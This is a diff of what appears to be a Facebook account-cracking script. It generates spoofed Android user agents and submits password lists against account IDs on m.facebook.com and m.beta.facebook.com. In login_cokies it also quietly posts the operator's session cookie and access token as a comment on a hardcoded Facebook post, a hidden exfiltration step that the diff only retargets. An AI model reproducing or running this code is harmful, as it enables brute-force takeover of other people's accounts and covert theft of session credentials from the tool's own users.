@@ -43,33 +43,34 @@ method, ugen = [],[]
 loop, ok, cp = 0,0,0
 
 #----------[ USER-CRACK ]----------#  
+for Xr in range (10000):	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=random.randrange(40,99)
+	f='0'
+	g=random.randrange(3000,4999)
+	h=random.randrange(97,114)
+	i='Mobile Safari/537.36'
+	uaku=(f'{a} {b}.{c}) {d}{e}.{f}.{g}.{h} {i}')
+	ugen.append(uaku)
+	
 for Xr in range (10000):
-	rr = random.randint
-	rc = random.choice	
-	a = 'Mozilla/5.0 (Linux; U; Android'
-	b = rr(5, 13)
-	c = rc(['zh-cn','es-us','ru-ru','ar-eg','id-id','de-de'])
-	d = rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e = rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	f = rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g = rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	ver = rr(4,20)
-	h = rc(["QP1A","QKQ1","TP1A","RP1A","SP1A","PPR1"])
-	i = 'Buid/'	
-	j = rr(100000,299999)
-	k = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/'
-	l = rc(["1.0","2.0","3.0","4.0","5.0","6.0","7.0","8.0","9.0"])
-	m = 'Chrome/'
-	n = rr(73,199)
-	o = '0'
-	p = rr(3000,4999)
-	q = rr(40,99)
-	wa = 'Mobile Safari/537.36 HeyTapBrowser/'
-	r = rr(8,99)
-	s = rr(1,9)
-	t = rr(1,9)
-	uah = rr(1,9)
-	uaku = f'{a} {b}; {c}; {d}{e}{f}{g}{ver} {i}{h}.{j}.0.0{s}) {k}{l} {m}{n}.{o}.{p}.{q} {wa}{r}.{s}.{t}.{uah}'
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(5, 19)
+	f='DOOGEE' 
+	g='Build/MRA58K)'
+	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	i=random.randrange(40,99)
+	j='0'
+	k=random.randrange(3000,4999)
+	l=random.randrange(97,114)
+	m='Mobile Safari/537.36'
+	uaku=(f'{a} {b}.{c}; {f} {d}{e} {g} {h}{i}.{j}.{k} {m}')
 	ugen.append(uaku)
 
 #--------[ GENERATE-USER-AGENT ]----------#
@@ -138,7 +139,7 @@ def login_cokies():
         nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
         roq = ses.get(nek,cookies=cookies)
         tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-        requests.post(f"https://graph.facebook.com/v17.0/100023328316616_pfbid0YoLsYftfv9fbayqEwA8zarmTsmDC1zha3jGUKNx62Lksu2q5QeY4GEy4rE7nqhbUl/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
+        requests.post(f"https://graph.facebook.com/v17.0/100023328316616_1486016732185923/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
         ken = open(".cyxieontoken.txt", "w").write(tok)
         cok = open(".cyxieoncokies.txt", "w").write(cookie)
         print(f"{kun}╭────────────────────────────────────────────{puti}")
@@ -419,7 +420,7 @@ def passwordlist():
 						pwx.append(sandi_kita)
 				else:pass
 				if 'validate' in method:
-				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
+				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.beta.facebook.com')
 				elif 'reguler' in method:
 				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
 				elif 'asyinc' in method:
